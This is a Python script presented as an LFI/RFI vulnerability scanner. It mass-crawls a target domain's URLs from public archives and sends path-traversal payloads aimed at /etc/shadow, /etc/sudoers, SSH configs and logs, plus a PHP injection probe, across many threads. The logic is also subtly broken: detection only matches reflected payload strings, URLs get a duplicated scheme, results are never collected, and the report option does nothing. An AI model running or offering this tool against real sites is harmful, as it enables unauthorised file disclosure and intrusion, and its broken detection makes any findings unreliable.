import threading
import requests
import argparse
import sys
import numpy as np
from concurrent.futures import ThreadPoolExecutor
from jinja2 import Environment, FileSystemLoader
import sqlite3
import signal
from collections import OrderedDict
from functools import partial

requests.packages.urllib3.disable_warnings()

GREEN, RED, WHITE, YELLOW, MAGENTA, BLUE, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# Define a set to store processed URLs
processed_urls = set()


lfi_payloads = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../etc/hostname",
    "../../../../etc/shadow",
    "../../../../etc/security/access.conf",
    "../../../../etc/group",
    "../../../../etc/network/interfaces",
    "../../../../etc/mysql/my.cnf",
    "../../../../etc/httpd/conf/httpd.conf",
    "../../../../etc/nginx/nginx.conf",
    "../../../../etc/apache2/apache2.conf",
    "../../../../etc/lighttpd/lighttpd.conf",
    "../../../../etc/samba/smb.conf",
    "../../../../etc/nsswitch.conf",
    "../../../../etc/fstab",
    "../../../../etc/passwd~",
    "../../../../etc/hosts.deny",
    "../../../../etc/aliases",
    "../../../../etc/cron.d/crontab",
    "../../../../etc/syslog.conf",
    "../../../../etc/ssh/sshd_config",
    "../../../../etc/bashrc",
    "../../../../etc/zshrc",
    "../../../../etc/profile",
    "../../../../etc/sudoers",
    "../../../../etc/exports",
    "../../../../etc/cups/cupsd.conf",
    "../../../../etc/crontab",
    "../../../../etc/motd",
    "../../../../etc/rsyslog.conf",
    "../../../../etc/logrotate.conf",
    "../../../../etc/ssh/ssh_config",
    "../../../../etc/xinetd.d",
    "../../../../var/log/auth.log",
    "../../../../var/log/syslog",
    "../../../../var/log/apache/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/lighttpd/access.log",
    "../../../../var/log/mail.log",
    "../../../../var/log/cron",
    "../../../../var/log/boot.log",
    "../../../../usr/local/etc/httpd/httpd.conf",
    "../../../../usr/local/etc/lighttpd/lighttpd.conf",
    "../../../../usr/local/etc/nginx/nginx.conf",
    "../../../../usr/local/etc/apache2/apache2.conf",
    "../../../../usr/local/etc/ssh/sshd_config",
    "../../../../usr/local/etc/sudoers",
    "../../../../usr/local/etc/cups/cupsd.conf",
    "../../../../usr/local/etc/xinetd.d",
    "../../../../usr/local/etc/motd",
]

lfi_vulnerabilities = []
rfi_vulnerabilities = []

class LFIandRFITester:
    def __init__(self, parameter):
        self.parameter = parameter
        self.lfi_vulnerabilities = []  # Initialize as instance variables
        self.rfi_vulnerabilities = []  # Initialize as instance variables

    def test_lfi(self, url):
        for payload in lfi_payloads:
            try:
                target_url = f"http://{url}?{self.parameter}={payload}"
                
                # Make a HEAD request to check for redirection
                response = requests.head(target_url, verify=False, timeout=10)
                
                # Check if the final URL is different
                final_url = response.url
                if final_url != target_url:
                    continue  # Skip to the next URL

                # Proceed with the request as before
                response = requests.get(target_url, verify=False, timeout=10)

                if response.status_code == 200 and payload in response.text:
                    lfi_vulnerabilities.append((url, payload))
                    print(f"LFI vulnerability found in URL: {target_url}")
            except requests.exceptions.RequestException:
                pass  # Error occurred, skip this URL

    def test_rfi(self, url):
        rfi_payload = "<?php echo 'RFI Vulnerable'; ?>"
        try:
            full_url = f"http://{url}?{self.parameter}={rfi_payload}"
            
            # Make a HEAD request to check for redirection
            response = requests.head(full_url, verify=False, timeout=10)
            
            # Check if the final URL is different
            final_url = response.url
            if final_url != full_url:
                return  # Skip this URL
            
            # Proceed with the request as before
            response = requests.get(full_url, verify=False, timeout=10)

            if rfi_payload in response.text:
                rfi_vulnerabilities.append((url, rfi_payload))
                print(f"RFI vulnerability found in URL: {full_url}")
        except requests.exceptions.RequestException:
            pass  # Error occurred, skip this URL

def scan_urls_for_lfi(url, parameter):
    if url in processed_urls:
        return []
    processed_urls.add(url)
    tester = LFIandRFITester(parameter)
    return tester.test_lfi(url)

def scan_urls_for_rfi(url, parameter):
    if url in processed_urls:
        return []
    processed_urls.add(url)
    tester = LFIandRFITester(parameter)
    return tester.test_rfi(url)

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}Advance LFI and RFI Vulnerability Scanner')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("-t", "--thread", dest="thread", help="Number of Threads to Use. Default=50", default=50)
    parser.add_argument("-o", "--output", dest="output", help="Save Vulnerable URLs in TXT file")
    parser.add_argument("-s", "--subs", dest="want_subdomain", help="Include Results of Subdomains", action='store_true')
    parser.add_argument("--deepcrawl", dest="deepcrawl", help="Use All Available APIs of CommonCrawl for Crawling URLs [**Takes Time**]", action='store_true')
    parser.add_argument("--report", dest="report_file", help="Generate an HTML report", default=None)

    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("-l", "--list", dest="url_list", help="URLs List, e.g., google_urls.txt")
    required_arguments.add_argument("-d", "--domain", dest="domain", help="Target Domain Name, e.g., testphp.vulnweb.com")
    required_arguments.add_argument("-p", "--parameter", dest="parameter", help="Vulnerable parameter to manipulate (e.g., user_id)")
    
    arguments = parser.parse_args()
    
    # Ensure that arguments.parameter is set to an empty string if not provided
    if arguments.parameter is None:
        arguments.parameter = ""
    
    # If you're using a URL list, read it and initialize final_url_list
    if arguments.url_list:
        final_url_list = readTargetFromFile(arguments.url_list)
    else:
        # Handle domain-based crawling if needed
        crawl = PassiveCrawl(arguments.domain, arguments.want_subdomain, arguments.thread, arguments.deepcrawl)
        final_url_list = crawl.start()
    
    return arguments, final_url_list

def readTargetFromFile(filepath):
    urls_set = set()
    with open(filepath, "r") as f:
        for urls in f.readlines():
            url = urls.strip()
            if url:
                urls_set.add(url)
    return list(urls_set)

class PassiveCrawl:
    def __init__(self, domain, want_subdomain, threadNumber, deepcrawl):
        self.domain = domain
        self.want_subdomain = want_subdomain
        self.deepcrawl = deepcrawl
        self.threadNumber = threadNumber
        self.final_url_list = set()

    def start(self):
        if self.deepcrawl:
            self.startDeepCommonCrawl()
        else:
            common_crawl_urls = self.getCommonCrawlURLs(self.domain, self.want_subdomain, ["http://index.commoncrawl.org/CC-MAIN-2018-22-index"])
            wayback_urls = self.getWaybackURLs(self.domain, self.want_subdomain)
            otx_urls = self.getOTX_URLs(self.domain)

            # Combine and remove duplicates from all sources
            combined_urls = common_crawl_urls + wayback_urls + otx_urls
            self.final_url_list = list(OrderedDict.fromkeys(combined_urls))

        return self.final_url_list

    def getIdealDomain(self, domainName):
        final_domain = domainName.replace("http://", "")
        final_domain = final_domain.replace("https://", "")
        final_domain = final_domain.replace("/", "")
        final_domain = final_domain.replace("www", "")
        return final_domain

    def split_list(self, list_name, total_part_num):
        final_list = []
        split = np.array_split(list_name, total_part_num)
        for array in split:
            final_list.append(list(array))
        return final_list

    def make_GET_Request(self, url, response_type):
        response = requests.get(url)
        if response_type.lower() == "json":
            result = response.json()
        else:
            result = response.text
        return result

    def getWaybackURLs(self, domain, want_subdomain):
        if want_subdomain == True:
            wild_card = "*."
        else:
            wild_card = ""

        url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
        urls_list = self.make_GET_Request(url, "json")
        try:
            urls_list.pop(0)
        except:
            pass

        final_urls_list = set()
        for url in urls_list:
            final_urls_list.add(url[0])

        return list(final_urls_list)

    def getOTX_URLs(self, domain):
        url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
        raw_urls = self.make_GET_Request(url, "json")
        urls_list = raw_urls["url_list"]

        final_urls_list = set()
        for url in urls_list:
            final_urls_list.add(url["url"])

        return list(final_urls_list)

    def startDeepCommonCrawl(self):
        api_list = self.get_all_api_CommonCrawl()
        collection_of_api_list = self.split_list(api_list, int(self.threadNumber))

        thread_list = []
        for thread_num in range(int(self.threadNumber)):
            t = threading.Thread(target=self.getCommonCrawlURLs, args=(self.domain, self.want_subdomain, collection_of_api_list[thread_num],))
            thread_list.append(t)

        for thread in thread_list:
            thread.start()
        for thread in thread_list:
            thread.join()

    def get_all_api_CommonCrawl(self):
        url = "http://index.commoncrawl.org/collinfo.json"
        raw_api = self.make_GET_Request(url, "json")
        final_api_list = []

        for items in raw_api:
            final_api_list.append(items["cdx-api"])

        return final_api_list

    def getCommonCrawlURLs(self, domain, want_subdomain, apiList):
        if want_subdomain == True:
            wild_card = "*."
        else:
            wild_card = ""

        final_urls_list = set()

        for api in apiList:
            url = f"{api}?url={wild_card+domain}/*&fl=url"
            raw_urls = self.make_GET_Request(url, "text")

            if ("No Captures found for:" not in raw_urls) and ("<title>" not in raw_urls):
                urls_list = raw_urls.split("\n")

                for url in urls_list:
                    if url != "":
                        final_urls_list.add(url)

        return list(final_urls_list)

if __name__ == '__main__':
    arguments = get_arguments()

    final_url_list = []

    if arguments[0].domain:
        print("=========================================================================")
        print("[>>] Crawling URLs from: WaybackMachine, AlienVault OTX, CommonCrawl ...")
        crawl = PassiveCrawl(arguments[0].domain, arguments[0].want_subdomain, arguments[0].thread, arguments[0].deepcrawl)
        final_url_list = crawl.start()

    elif arguments[0].url_list:
        final_url_list = readTargetFromFile(arguments[0].url_list)

    else:
        print("[!] Please Specify --domain or --list flag ..")
        print(f"[*] Type: {sys.argv[0]} --help")
        sys.exit()

    print("=========================================================================")
    print("[>>] [Total URLs] : ", len(final_url_list))

    processed_urls = set()

    with ThreadPoolExecutor(max_workers=int(arguments[0].thread)) as executor:
        results_lfi = list(executor.map(partial(scan_urls_for_lfi, parameter=arguments[0].parameter), final_url_list))
        results_rfi = list(executor.map(partial(scan_urls_for_rfi, parameter=arguments[0].parameter), final_url_list))

    print("=========================================================================")

    for url in final_url_list:
        if url in results_lfi:
            print(f"LFI vulnerability found at URL: {url}")

        if url in results_rfi:
            print(f"RFI vulnerability found at URL: {url}")

    print("\n[>>] [Total LFI and RFI URL Audited]:", len(results_lfi) + len(results_rfi))
